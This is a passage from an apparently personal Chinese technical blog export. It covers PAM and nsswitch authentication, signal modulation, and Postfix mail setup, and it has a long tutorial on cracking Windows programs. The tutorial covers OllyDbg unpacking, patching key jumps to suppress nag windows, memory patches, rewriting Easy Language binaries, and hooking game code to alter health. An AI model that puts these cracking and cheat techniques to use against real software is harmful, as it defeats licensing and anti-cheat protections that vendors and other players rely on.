class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn8"><p>PDU (<strong>Protocol Data
Unit</strong>)是指对等层次之间传递的数据单位<a href="#fnref8"
class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>大学</category>
      </categories>
  </entry>
  <entry>
    <title>认证与授权</title>
    <url>/%E8%AE%A4%E8%AF%81%E4%B8%8E%E6%8E%88%E6%9D%83/</url>
    <content><![CDATA[<h1 id="认证与授权">认证与授权</h1>
<ul>
<li>Authentication（认证）
<ul>
<li>用户的用户名和密码是否能通过检验。</li>
</ul></li>
<li>Authorizantion（授权）
<ul>
<li>用户是否被允许访问服务或资源。</li>
</ul></li>
</ul>
<h1 id="nsswitchpam">nsswitch&amp;pam</h1>
<span id="more"></span>
<h2 id="nsswitch-提供名称解析">nsswitch-提供名称解析</h2>
<h4 id="network-service-switch-网络服务转换">network service switch
网络服务转换</h4>
<p><code>/etc/nsswitch.conf</code></p>
<p>库文件路径<code>/usr/lib[64]/libnss*</code></p>
<p>说白了就是名称解析，nss定义了以何种方式，何种途径，何种顺序来查找特定信息</p>
<h4 id="返回机制">返回机制</h4>
<ul>
<li>SUCCESS
<ul>
<li>service ok,name found</li>
</ul></li>
<li>NOTFOUND
<ul>
<li>service ok,name not found</li>
</ul></li>
<li>UNAVAIL
<ul>
<li>service not available</li>
</ul></li>
<li>TRYAGAIN
<ul>
<li>temporary service failure-临时故障</li>
</ul></li>
</ul>
<h5
id="返回了success不继续使用其他查找方式">返回了success，不继续使用其他查找方式</h5>
<h4 id="返回动作">返回动作</h4>
<ul>
<li>return
<ul>
<li>返回</li>
</ul></li>
<li>continue
<ul>
<li>继续</li>
</ul></li>
</ul>
<h4 id="查找方式">查找方式</h4>
<ul>
<li>files</li>
<li>nis/nisplus</li>
<li>dns</li>
<li>db</li>
</ul>
<h5 id="服务名-查找方式-返回机制-更多查找方式">服务名： 查找方式 <a
href="#返回机制">返回机制</a> 更多查找方式</h5>
<p><code>passwd: nis [NOTFOUND=return] files</code></p>
<hr />
<h2 id="pam-提供认证">pam-提供认证</h2>
<h3 id="pluggable-authentication-module-可插入式认证模块">Pluggable
Authentication Module 可插入式认证模块</h3>
<p><code>/etc/pam.d/service</code></p>
<p>一个服务框架，用于认证功能，其他服务依赖于此机制，如果在nsswitch中使用了pam认证方式，pam就能使用特定的库来实现认证功能，通过配置文件对认证过程实现配置</p>
<h4 id="type--类型组">type -类型/组</h4>
<ul>
<li>account</li>
<li>auth</li>
<li>password</li>
<li>session</li>
</ul>
<h4 id="control-控制">control-控制</h4>
<h5 id="根据返回值进行处理">根据返回值进行处理</h5>
<ul>
<li>required-<strong>需求</strong>
<ul>
<li>一票否决，必须满足</li>
<li>无论是否通过检查，都继续检查</li>
</ul></li>
<li>requisite-<strong>必须的</strong>
<ul>
<li>真正的一票否决，必须满足</li>
<li>只要检查不通过，就不用继续检查后面了，直接返回</li>
</ul></li>
<li>sufficient-<strong>充分条件</strong>
<ul>
<li>一票通过</li>
<li>如果没通过，不干涉后续检查</li>
</ul></li>
<li>optional-<strong>可选</strong>
<ul>
<li>无所谓的选项</li>
</ul></li>
<li>include-<strong>移权给其他文件</strong></li>
</ul>
<h3 id="另一种控制方式">另一种控制方式</h3>
<p><code>value1=action1 value2=action2 ……</code></p>
<h4 id="value-返回值">value-返回值</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">success、open_err、symbol_err、service_err、 system_err、buf_err、perm_denied、auth_err、cred_insufficient、authinfo_unavail、user_unknown、maxtries、new_authtok_reqd、acct_expired、 session_err、cred_unavail、cred_expired、cred_err、no_module_data、conv_err、 authtok_err、authtok_recover_err、authtok_lock_busy、authtok_disable_aging、 try_again、ignore、abort、authtok_expired、module_unknown、bad_item和default</span><br></pre></td></tr></table></figure>
<h4 id="actions-动作动作">actions-动作/动作</h4>
<ul>
<li>ok
<ul>
<li>当前检查通过，继续检查</li>
</ul></li>
<li>done
<ul>
<li>一票通过，不继续检查，返回最终结果</li>
</ul></li>
<li>bad
<ul>
<li>当前检察失败，继续检查</li>
</ul></li>
<li>die
<ul>
<li>一票否决，不继续检查，返回最终结果</li>
</ul></li>
<li>ignore
<ul>
<li>忽略</li>
</ul></li>
<li>reset
<ul>
<li>忽略所有结果，重新继续</li>
</ul></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type	control		module_name 	module_parameter</span><br><span class="line">auth	requisite	pam_successd_if.so uid &lt; 500 quit</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
  </entry>
  <entry>
    <title>调制与解调</title>
    <url>/%E8%B0%83%E5%88%B6%E4%B8%8E%E8%A7%A3%E8%B0%83/</url>
    <content><![CDATA[<h1 id="调制与解调">调制与解调</h1>
<h2 id="相关术语">相关术语</h2>
<ul>
<li>消息(massage)-有意义的实体</li>
<li>数据(data)-运送消息的实体，编码后的消息</li>
<li>信号(signal)-数据的表现形式，电器/电磁表现</li>
</ul>
<span id="more"></span>
<h2 id="信号分类">信号分类</h2>
<h3 id="数字信号">数字信号</h3>
<ul>
<li>离散的</li>
</ul>
<h3 id="模拟信号">模拟信号</h3>
<ul>
<li>连续的</li>
</ul>
<h2 id="数据分类">数据分类</h2>
<ul>
<li>模拟数据</li>
<li>数字数据</li>
</ul>
<h2 id="码元">码元</h2>
<p>这只是我的理解，我搜索了很多资料，都是在说电平云云。</p>
<p>导体传输信号，他的最高电平是+5v，最低电压是-5v。</p>
<p>以下说明建立在<strong>归零制</strong>的前提下，且在理想条件下，没有介质电阻导致压降，且接收端没有误差，理论上，是可以无限制的分区段的</p>
<p>现在我们定义+5v代表为1，-5v代表0，0v不代表信息。那么这套系统每一次非归零的跳变都传输了1bit，设每秒发生一次跳变，则他的比特率为1bps，波特率也等于1baud。</p>
<p>我们把-5v到+5v分成四个区段，令-5v代表00，-2.5v代表01，+2.5v代表10，+5v代表11，设每秒发生一次跳变，那么这套系统每次非归零的跳变传输了2bit，则它的比特率为2bps，波特率为1baud。他有四个种离散状态，称为四进制码元。</p>
<p>我们把-5V到+5v分成八个区段，令-5v代表000，-3.75v代表001，-2.5v代表010，-1.25v代表011，1.25v代表100，2.5v代表101，3.75v代表110，5v代表111。那么这套系统每一次非归零的跳变都传输了3bit，设每秒发生一次跳变，则它的比特率为3bps，波特率为1baud。他有八种离散状态，称为八进制码元。</p>
<p>以此类推，如果可以把-5v到+5v均分成更多2的整数次方个区段，那么理论上每次发生非归零的跳变都会发送<span
class="math inline">\(\log_{2}区段数\)</span>个bit。但是每次只发送了1baud。</p>
<h3 id="波特率计算">波特率计算</h3>
<p><span class="math display">\[
I=S\log_2N​
\]</span></p>
<p>其中<span class="math inline">\(I\)</span> 为传信率，<span
class="math inline">\(S\)</span> 为波特率，<span
class="math inline">\(N\)</span> 为每个码元负载的信息量，而<span
class="math inline">\(\log _{2}{N}\)</span>以比特为单位。</p>
<h2 id="基带信号">基带信号</h2>
<p>基本频带信号，信源信号，原始信号，一般为数字信号</p>
<h3 id="基带调制">基带调制</h3>
<p>基带信号进行波形变换，这种过程称为编码(<strong>coding</strong>)，编码后的信号能通过一定手段还原。基带调制后的信号仍然是基带信号</p>
<h3 id="带通调制">带通调制</h3>
<p>使用载波(<strong>carrier</strong>)进行调制，把基带信号加载到高频信号上，并转换为模拟信号，这种过程叫做带通调制</p>
<h4 id="带通信号">带通信号</h4>
<p>经过带通调制的模拟信号叫做带通信号</p>
<h2 id="数字信号基带信号常用编码方式">数字信号/基带信号常用编码方式</h2>
<ul>
<li><strong>不归零制</strong>：正电平代表1，负电平代表0</li>
<li><strong>归零制</strong>：正脉冲代表1，负脉冲代表0</li>
<li><strong>曼彻斯特编码</strong>：周期中心向上跳变代表1，周期中心向下跳变代表0，反之亦可</li>
<li><strong>差分曼彻斯特编码</strong>：每一位中心始终有跳变，位边界有跳变代表0，位边界没有跳变代表1</li>
</ul>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/常见数字信号编码.png" /></p>
<h4
id="从波形来看曼彻斯特编码产生信号的频率比不归零制高">从波形来看：曼彻斯特编码产生信号的频率比不归零制高</h4>
<h4
id="从自同步能力来看-不归零制不能推断信号的时钟频率这叫没有自同步能力曼彻斯特与差分曼彻斯特编码可以推断信号的始终频率具有自同步能力">从自同步能力来看
，不归零制不能推断信号的时钟频率，这叫没有自同步能力；曼彻斯特与差分曼彻斯特编码可以推断信号的始终频率，具有自同步能力</h4>
<hr />
<h2 id="基本带通载波信号调制">基本带通/载波信号调制</h2>
<ul>
<li>调幅(AM)：载波的振幅随基带数字信号变化，可用乘法器实现，也叫幅度键控</li>
<li>调频(FM)：载波的频率随基带数字信号变化，也叫频移键控</li>
<li>调相(PM)：载波的初始相位随基带数字信号变化，也叫相移键控</li>
</ul>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/基本带通调制方法.jpg" /></p>
<h3 id="为什么需要载波调制">为什么需要载波调制</h3>
<ul>
<li>因为数字基带信号主要集中在低频段，只适合在低通型信道中传输。但是带通型信道更常见，所以必须用数字基带信号对载波进行调制，使基带信号搬移到高频的载波频率上。</li>
<li>天线尺寸(<span class="math inline">\(\lambda/4\)</span>)，其中<span
class="math inline">\(\lambda=c/f\)</span>为载波波长</li>
</ul>
<h3 id="调频调幅调制与信号的关系">调频调幅调制与信号的关系</h3>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/调频调幅与信号关系.gif" /></p>
<h3 id="二进制数字调制">二进制数字调制</h3>
<h4 id="二进制幅度键控2ask">二进制幅度键控（2ASK）</h4>
<ul>
<li>在幅度键控中，载波幅度随调制信号而变化，载波的幅度随着数字信号1和0在两个电平间转换。</li>
<li>二进制幅度控件又称为<strong>通-断控件</strong>（OOK）</li>
<li>OOK信号的时域表达</li>
</ul>
<p><span class="math display">\[
S_{OOK}(t)=a_n \cdot Acos\omega_ct
\]</span></p>
其中a为二进制信息，可表示为 $$ a_n
<span class="math display">\[\begin{cases}
0 出现概率为P\\
1 出现概率为1-P

\end{cases}\]</span>
<p>$$</p>
]]></content>
      <categories>
        <category>无线电</category>
      </categories>
  </entry>
  <entry>
    <title>软件破解</title>
    <url>/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="windows-程序的调试与破解">Windows 程序的调试与破解</h1>
<h2 id="od脱壳方法">OD脱壳方法</h2>
<h3 id="单步跟踪法">单步跟踪法</h3>
<p>脱壳的方法有很多，先来讲脱壳方法中最基础的单步跟踪法。单步跟踪法就是利用OD的单条指令执行功能，从壳的入口一直执行到OEP，最终通过这个OEP将原程序dump出来。然当，在单步跟踪的时候需要跳过一些不能执行到的指令。
使用单步跟踪法追踪OEP的常见步骤：</p>
<ol type="1">
<li>用OD载入待脱壳文件，如果出现压缩提示，选择“不分析代码”；</li>
<li>向下单步跟踪，实现向下的跳转；</li>
<li>遇到程序往上跳转的时候（包括循环），在回跳的下一句代码上单击并按键盘上的“F4”键跳过回跳指令；</li>
<li>OD中的绿色线条表示跳转没有实理，不必理会，红色线条表示跳转已经实现；</li>
<li>如果刚载入程序的时候，在附近有一个CALL指令，那么就要按键盘上的“F7”键跟进这个CALL内，不然程序很容易运行起来；</li>
<li>在跟踪的时候，如果执行某个CALL指令后就运行，一定要按键盘上的“F7”键进入这个CALL之内再单步跟踪；</li>
<li>遇到在popad指令下的远转移指令时，要格处注意，因为这个远转移指令的目的地很可能就是OEP。</li>
</ol>
<span id="more"></span>
<hr />
<h3 id="esp定律法">ESP定律法</h3>
<p>ESP定律法是脱壳的利器，是国外友人发现的。有了ESP定律，可以方便我们脱掉大多数的压缩壳。可谓是本世纪破解界中最伟大的发现之一。这里只简单的看一下狭义ESP定律的原理。
使用ESP定律追踪OEP的常见步骤：</p>
<ol type="1">
<li>将待脱壳程序载入到OD中，开始就按键盘上的“F8”键单步跟踪一步，这时如果看到OD右边的寄存器窗口中的ESP寄存器的值有没有变为红色，如果发现ESP寄存器的值变为红色，执行第2步；</li>
<li>在OD的命令行窗口中执行命令hrXXXXXXXX,xxxxxxxx就是变为红色的ESP寄存器的值，在输入命令之后，一定不要忘记按键盘上的回车键；</li>
<li>按键盘上的“F9”键让程序运行起来；</li>
<li>使用单步跟踪的方法跟踪到OEP即可。</li>
</ol>
<hr />
<h3 id="二次断点法">二次断点法</h3>
<p>二次断点是有技巧的下两个断点，在两个断点之后就可以很轻松的找到OEP。
使用二次断点法追踪OEP的常见步骤：</p>
<ol type="1">
<li>将待脱壳程序载入到OD中，单击OD的“选项”菜单下的“调试设置”命令，在弹出的“调试选项”对话框中切换到“异常”选项卡，勾选该选项卡下的所有复选框，也就是忽略所有异常；</li>
<li>按键盘上的“ALT+M”组合键打开OD的内存窗口；</li>
<li>在OD的内存窗口中找到“.rsrc”区段，单击该区段后按键盘上的“F2”键在该区段上下一断点；</li>
<li>按“Shift+F9”让程序运行到断点心处，而后再次打开OD的内存窗口，这次在“.rsrc”区段上面的“.code”区段（有的时候就是“.text”）上下一个断点；</li>
<li>按“shift+F9”让程序运行到第二次下的断点处，然后单步跟踪既可以来到OEP。</li>
</ol>
<hr />
<h3 id="末次异常法">末次异常法</h3>
<p>在脱壳方法中，末次异常法又被称为最后一次异常法，这是最基础的脱壳技术之一。末次异常法脱壳很是简单，但就是这简单的脱壳方法可以挑掉曾经风靡一时的强壳。
使用末次异常法追踪OEP的常见步骤：</p>
<ol type="1">
<li>将待脱壳程序载入到OD中，单击OD的“选项”菜单，在弹出的菜单中单击“调试设置”命令，在随后弹出的“调试选项”对话框中切换到“异常”选项卡，清除该选项卡下所有复选框，也就是不忽略任何异常；</li>
<li>连续按键盘上的“Shift+F9”组合键让程序运行起来，记录按键的次数X；</li>
<li>回到OD中，按键盘上的“Ctrl+F2”组合键重新载入程序，按X-1次“Shift+F9”组合键；</li>
<li>在OD右下角窗口中找到“SE句柄”或是“SE处理程序”，记录此处的内存地址；</li>
<li>在OD的反汇编窗口中跟随到上一步记录下的内存地址，并在此内存地址处下一个断点；</li>
<li>按键盘上的“Shift+F9”组合键让程序运行到上一步下的断点处，按键盘上的“F2”键取消此处的断点；</li>
<li>使用单步跟踪法追踪到OEP。</li>
</ol>
<hr />
<h3 id="模拟跟踪法">模拟跟踪法</h3>
<p>在这章中讲到的众多脱壳方法中，我们首先讲了单步跟踪法脱壳，因为单步跟踪脱壳法是脱壳技术中最基础的方法，在后面其它的一些脱壳方法中总会或多或少的配合单步跟踪法才能顺利完成脱壳工作。便是始终是一次次的按“F8”键来单步跟踪程序，偶尔遇到回跳就跳过执行，这样机械性的操作很是烦人，那么能不能让机器来代替人力，让工具帮我们单步跟踪呢？答案是肯定的，这也就是这节讲的内容——模拟跟踪法。模拟脱壳法就是模拟单步跟踪来进行查找OEP。
模拟跟踪法的常见步骤：</p>
<ol type="1">
<li>将待脱壳程序载入OD中，先简单的跟踪一下程序，看看有没有SEH暗桩；</li>
<li>按键盘上的“ALT+F9”打开OD的内存窗口，找到“SFX，输入表，资源”的行，并记录此行的内存地址；</li>
<li>在OD的命令行窗口执行命令“tc
eip&lt;上一步中记录下的地址”，命令执行后就会跟踪到OEP。</li>
</ol>
<hr />
<h3 id="sfx自动脱壳法">SFX自动脱壳法</h3>
<p>在上一节，我们使用模拟跟踪法代替手动单步跟踪法进行脱壳。在OD中，不但可以利用模拟跟踪来代替单步跟踪进行脱壳，从而节省劳动力，还有一种SFX自动脱壳的方法也可以节省劳动力，并能快速有效的将程序的壳脱掉。
使用SFX自动脱壳法脱壳的常见步骤：</p>
<ol type="1">
<li>将OD设置为忽略所有异常；</li>
<li>在OD的“调试选项”对话框的“SFX”选项卡中选择“字节模式跟踪实际入口”选项并确定；</li>
<li>将待脱壳程序载入OD，待程序载入完成后，会直接停在OEP处。</li>
</ol>
<hr />
<h3 id="出口标志法">出口标志法</h3>
<p>前面几个脱壳方法中有一个共同点，就是在单步跟踪到popad指令后面不远处的jmp指令的时候，就可以大胆的判断这个jmp指令的目的地址就是OEP。原因很简单，popad指令用于将壳运行之前保存的环境恢复，使原程序能正常运行。有些壳的popad指令很少，我们就可以查看被这种壳加壳的程序的所有popad指令，找到后面存在jmp指令的popad指令，然后来到其后的jmp指令的目的地址，这很可能就是OEP，然后就可以进行dump脱壳了。
使用出口标志法脱壳的常见步骤：</p>
<ol type="1">
<li><p>将待脱壳程序载入OD中，在OD的反汇编客人口中单击鼠标右键，在弹出的右键菜单中单击“查找”→“所有命令”，在弹出的输入框中输入“popad”并按“查找”按钮；</p></li>
<li><p>逐一尝试跟踪查找到的所有“popad”指令，最终达到程序的OEP</p></li>
</ol>
<hr />
<h3 id="pecompact高版本-特征码定位法">PECompact高版本-特征码定位法</h3>
<ol type="1">
<li>下断点<code>bp VirtualFree</code>，中断后取消断点，alt+F9返回程序代码段</li>
<li>ctrl+f 查找push 8000（特征码），下断点</li>
<li>shift+f9 在断点处停止，取消断点</li>
<li>单步跟踪到OEP</li>
</ol>
<hr />
<h2 id="特殊断点">特殊断点</h2>
<h3 id="超级断点">超级断点</h3>
<p>原理：在widows 最基础的模块 user32
处下断点，这样就可以做到，你做出任何动作都会发生中断。</p>
<ol type="1">
<li>鼠标右键-&gt;查看-&gt;user32 进入代码段</li>
<li>Ctrl+b 查找
<code>F3 A5 8B C8 83 E1 03 F3 A4 E8</code>,在这里下断点。</li>
<li>shift+f9 返回用户代码</li>
<li>单步跟踪，观察堆栈及寄存器内容有无特殊字符串</li>
</ol>
<hr />
<h3 id="配置文件断点">配置文件断点</h3>
<p>原理： 在程序读取配置文件的代码段上下断点，来中断程序运行。</p>
<ol type="1">
<li>在悬浮窗上有个BP选项卡，点击查看</li>
<li>找到<code>BP GetPrivateProfileStringA</code>，点击即可下断点</li>
<li>单步跟踪，观察堆栈及寄存器内容有无特殊字符串</li>
</ol>
<hr />
<h3 id="vb专属断点">VB专属断点</h3>
<p>原理：VB有自己特有的系统调用，所以在系统调用上下断点就可以中断程序。</p>
<ol type="1">
<li>在悬浮窗上找到VB选项卡，点击查看</li>
<li>常用的是 BP rtcMsgBox，消息窗口</li>
</ol>
<hr />
<h2 id="软件破解">软件破解</h2>
<h4 id="干掉烦人的窗口">干掉烦人的窗口</h4>
<p>原理：找到系统调用，返回程序领空，通过修改条件跳转实现不弹出窗口的目的。</p>
<ol type="1">
<li>运行，窗口弹出后点击暂停键，跳转到窗口弹出的代码段</li>
<li>点击k 显示调用堆栈，找到本提示窗的调用堆栈，显式调用</li>
<li>不要nop掉窗口信息，应该找到决定这串信息的关键跳转，向下走</li>
<li>单步步过，经过return，找回自己的代码段，找出关键跳转</li>
<li>干掉关键跳转</li>
</ol>
<hr />
<h4 id="有壳程序破解">有壳程序破解</h4>
<p>原理：使用内存补丁，在不修改程序结构的前提下实现修改进程内存</p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/PYG内存补丁制作工具.png" /></p>
<ol type="1">
<li>添加程序</li>
<li>添加补丁地址</li>
<li>填写原来的机器码</li>
<li>替换为新的机器码</li>
<li>点击添加</li>
<li>点击生成即可</li>
</ol>
<hr />
<h2 id="易语言特征">易语言特征</h2>
<h3 id="子窗口头尾">子窗口头尾</h3>
<figure class="highlight arm"><figcaption><span>Assembly</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">;头部</span></span><br><span class="line"><span class="number">004010</span><span class="built_in">F3</span>  /.  <span class="number">55</span>            <span class="keyword">push</span> ebp</span><br><span class="line"><span class="number">004010</span><span class="built_in">F4</span>  <span class="title">|.  8BEC          mov ebp,esp</span></span><br><span class="line"><span class="title">;尾部</span></span><br><span class="line"><span class="title">0040115E  |</span>.  <span class="number">8</span>BE5          <span class="keyword">mov</span> esp,ebp</span><br><span class="line"><span class="number">00401160</span>  <span class="title">|.  5D            pop ebp</span></span><br><span class="line"><span class="title">00401161  \.  C3            retn</span></span><br></pre></td></tr></table></figure>
<h3 id="信息框">信息框</h3>
<p>信息框从<code>mov ebx,0x6</code>开始，到<code>add esp,0x34</code>结束</p>
<figure class="highlight arm"><figcaption><span>Assembly</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">0040104</span>B  <span class="title">|.  BB 06000000   mov ebx,0x6</span></span><br><span class="line"><span class="title">00401050  |</span>.  E8 AFFFFFFF   call 弹窗整合.<span class="number">00401004</span></span><br><span class="line"><span class="number">00401055</span>  <span class="title">|.  68 01030080   push 0x80000301</span></span><br><span class="line"><span class="title">0040105A  |</span>.  <span class="number">6</span>A <span class="number">00</span>         <span class="keyword">push</span> <span class="number">0x0</span></span><br><span class="line"><span class="number">0040105</span>C  <span class="title">|.  68 00000000   push 0x0</span></span><br><span class="line"><span class="title">00401061  |</span>.  <span class="number">68</span> <span class="number">04000080</span>   <span class="keyword">push</span> <span class="number">0x80000004</span></span><br><span class="line"><span class="number">00401066</span>  <span class="title">|.  6A 00         push 0x0</span></span><br><span class="line"><span class="title">00401068  |</span>.  <span class="number">68</span> ACE64700   <span class="keyword">push</span> 弹窗整合.<span class="number">0047</span>E6AC  <span class="comment">; ASCII &quot;这是一个信息框&quot;</span></span><br><span class="line"><span class="number">0040106</span>D  <span class="title">|.  68 04000000   push 0x4</span></span><br><span class="line"><span class="title">00401072  |</span>.  BB <span class="number">80124000</span>   <span class="keyword">mov</span> ebx,弹窗整合.<span class="number">00401280</span></span><br><span class="line"><span class="number">00401077</span>  <span class="title">|.  E8 C3000000   call 弹窗整合.0040113F</span></span><br><span class="line"><span class="title">0040107C  |</span>.  <span class="number">83</span><span class="built_in">C4</span> <span class="number">34</span>       <span class="keyword">add</span> esp,<span class="number">0x34</span></span><br></pre></td></tr></table></figure>
<h3 id="窗口">窗口</h3>
<p>窗口从<code>push 0x80000002</code>开始，到<code>add esp,0x28</code>结束</p>
<figure class="highlight arm"><figcaption><span>Assembly</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">0040107</span>F   <span class="title">|.  68 02000080   push 0x80000002</span></span><br><span class="line"><span class="title">00401084   |</span>.  <span class="number">6</span>A <span class="number">00</span>         <span class="keyword">push</span> <span class="number">0x0</span></span><br><span class="line"><span class="number">00401086</span>   <span class="title">|.  68 01000000   push 0x1</span></span><br><span class="line"><span class="title">0040108B   |</span>.  <span class="number">68</span> <span class="number">01000100</span>   <span class="keyword">push</span> <span class="number">0x10001</span></span><br><span class="line"><span class="number">00401090</span>   <span class="title">|.  68 00000106   push 0x6010000</span></span><br><span class="line"><span class="title">00401095   |</span>.  <span class="number">68</span> <span class="number">01000152</span>   <span class="keyword">push</span> <span class="number">0x52010001</span></span><br><span class="line"><span class="number">0040109</span>A   <span class="title">|.  68 01000100   push 0x10001</span></span><br><span class="line"><span class="title">0040109F   |</span>.  <span class="number">68</span> <span class="number">0B00010</span>6   <span class="keyword">push</span> <span class="number">0x601000B</span></span><br><span class="line"><span class="number">004010</span><span class="built_in">A4</span>   <span class="title">|.  68 0C000152   push 0x5201000C</span></span><br><span class="line"><span class="title">004010A9   |</span>.  <span class="number">68</span> <span class="number">03000000</span>   <span class="keyword">push</span> <span class="number">0x3</span></span><br><span class="line"><span class="number">004010</span>AE   <span class="title">|.  BB C0114000   mov ebx,弹窗整合.004011C0</span></span><br><span class="line"><span class="title">004010B3   |</span>.  E8 F7000000   call 弹窗整合.<span class="number">004011</span>AF</span><br><span class="line"><span class="number">004010</span>B8   <span class="title">|.  83C4 28       add esp,0x28</span></span><br></pre></td></tr></table></figure>
<h3 id="子程序结束">子程序结束</h3>
<figure class="highlight arm"><figcaption><span>Assembly</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">004010</span>EF   <span class="title">|.  8BE5          mov esp,ebp</span></span><br><span class="line"><span class="title">004010F1   |</span>.  <span class="number">5</span>D            <span class="keyword">pop</span> ebp</span><br><span class="line"><span class="number">004010</span><span class="built_in">F2</span>   \.  <span class="built_in">C3</span>            retn</span><br></pre></td></tr></table></figure>
<h3 id="注意">注意</h3>
<p>粘贴二进制的时候，可能会产生一些错误，例如<code>call</code>后面的地址会发生变化，这样的话，有必要先对原来的窗口信息以文本方式复制下来，在二进制粘贴完之后，进行手动校对。</p>
<hr />
<h2 id="易语言程序破解">易语言程序破解</h2>
<h3 id="pushd窗体法">pushd窗体法</h3>
<ol type="1">
<li>ctrl+g跳转到<code>00401000</code></li>
<li>ctrl+b查找二进制字串 勾选整个块<code>FF 25</code></li>
<li>看到一堆的jmp 确定是易语言程序</li>
<li>在jmp上面的<code>push 0520*</code>窗体就是启动窗体，就是程序进入的第一个窗体</li>
<li>循环查找所有窗体
<ol type="1">
<li>查找命令 勾选整个块 <code>push 10001</code></li>
<li>看到<code>push 0520*</code>就是一个窗体</li>
</ol></li>
<li>替换启动窗体</li>
</ol>
<h3 id="拖放控件的破解">拖放控件的破解</h3>
<ol type="1">
<li>ctrl+B搜索<code>FF 55 FC 5F 5E</code>，这是拖放控件特征码</li>
<li>下断点，拖放程序</li>
<li>进入拖放控件的call</li>
<li>向下运行查找关键call</li>
</ol>
<h3 id="替换窗体">替换窗体</h3>
<ol type="1">
<li>Ctrl+B搜索<code>FF 25</code>找到易语言特有的一串jump</li>
<li>向上查找你想替换的窗口与目标窗口</li>
<li>复制你想复制的窗口在两个<code>mov ebp,esp</code>之间</li>
<li>复制到剪切板，二进制复制，同时粘贴到记事本里</li>
<li>找到目标窗口，在第一个<code>mov ebp,esp</code>之后，选择一段区域，可以多选但是不能少选，否则指令地址不够填充</li>
<li>粘贴到目标窗口的选区，修改<code>call 窗口名称</code>的汇编指令，因为在二进制粘贴时会产生一些错误。这时参考粘贴在记事本中的结构就可以了。</li>
<li>使用收尾指令二进制指令<code>8B E5 5D C3</code>，粘贴在窗体的结束指令<code>add esp,0x28</code>后面</li>
<li>复制所有更改到文件即可</li>
</ol>
<h3 id="替换文字">替换文字</h3>
<ol type="1">
<li>先找到字符串常量存储的位置</li>
<li>向下查找没有使用过的空间，修改成你想变成的字符串</li>
<li>然后在搜索到的ASCII码处修改你的字符串的位置</li>
<li><code>ARM Assembly    00401147  |.  68 12F94700   push 弹窗整合.0047F912 ;  ASCII "呵呵呵"</code></li>
<li><code>0047F912</code>就是数据地址，修改地址到你的数据的地址即可</li>
</ol>
<h2 id="游戏破解">游戏破解</h2>
<h3 id="hook技术">HOOK技术</h3>
<h4 id="hook的用处">HOOK的用处</h4>
<ul>
<li>挂钩代码，实现直接读取数值</li>
<li>修改数据，不执行某代码</li>
<li>过检测，修改代码</li>
</ul>
<h4 id="作用方式">作用方式</h4>
<ol type="1">
<li>直接修改</li>
<li>间接修改
<ol type="1">
<li>找到空白区域写入自己想要执行的数据</li>
<li>在原地址上执行跳转指令</li>
<li>在空白区域自己的指令上写入retn返回到原来的代码区域</li>
</ol></li>
<li>直接读取</li>
</ol>
<h3 id="修改思路">修改思路</h3>
<ol type="1">
<li>当无法直接找到某代码的位置时，要先思考该代码会给游戏带来的影响</li>
<li>例如你被敌人打到了，你会扣血，你可以在现有血量的位置看，找出时什么访问了这个地址</li>
<li>当你找到访问血量数量的地址的时候，你就可以找到血量存储的位置</li>
<li>在数据窗口中跟随，下一个内存写入的断点，当再次触发扣血指令时，就会中断</li>
<li>点击k，显示调用堆栈，就可以看到有多少地方写入了这里</li>
<li>排除不是控制血量的代码</li>
</ol>
<p>就可以找出扣血代码</p>
]]></content>
  </entry>
  <entry>
    <title>邮件服务相关</title>
    <url>/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<h3 id="postfix邮件服务器">postfix邮件服务器</h3>
<p>主流服务器叫做sendmail,由于业务原因,现在的邮件服务器大都使用sendmail软件发送,但是效率很低,所以大家现在更喜欢效率更高的,开源的邮件服务器postfix,但是postfix并没有configure文件,所以需要使用命令生成make文件
<code>make makefiles 参数</code>
生成make文件,在后续指定文件生成位置,在make的时候可以选择</p>
<h4 id="验证服务框架-cyrus-sasl">验证服务框架 cyrus-sasl</h4>
<p>默认安装这三个包就可以让postfix支持sasl了!</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyrus-sasl</span><br><span class="line">cyrus-sasl-plain</span><br><span class="line">cyrus-sasl-devel</span><br></pre></td></tr></table></figure>
<p>　　SASL全称Simple Authentication and Security
Layer,是一种用来扩充C/S模式验证能力的机制.在Postfix可以利用SASL来判断用户是否有权使用转发服务,或是辨认谁在使用你的服务器.
　　SASL提供了一个通用的方法为基于连接的协议增加验证支持,也称作sasl框架.</p>
<p>因为smtp(simple mail transfer
protocol)十分简单,没有认证功能,所以需要sasl框架扩充. sasl
验证方式配置文件在<code>/etc/sysconfig/saslauthd</code>
Debian系系统的配置文件在<code>/etc/default/saslauthd</code></p>
<p>服务脚本叫<code>saslauthd</code> #### 鸽子笼 (dovecot)
一个支持多种协议的客户端接收协议软件 支持imap imaps pop3 pop3s
默认启用四种协议 内置sasl,且支持外置sasl框架</p>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
  </entry>
  <entry>
    <title>靶场59</title>
    <url>/%E9%9D%B6%E5%9C%BA54/</url>
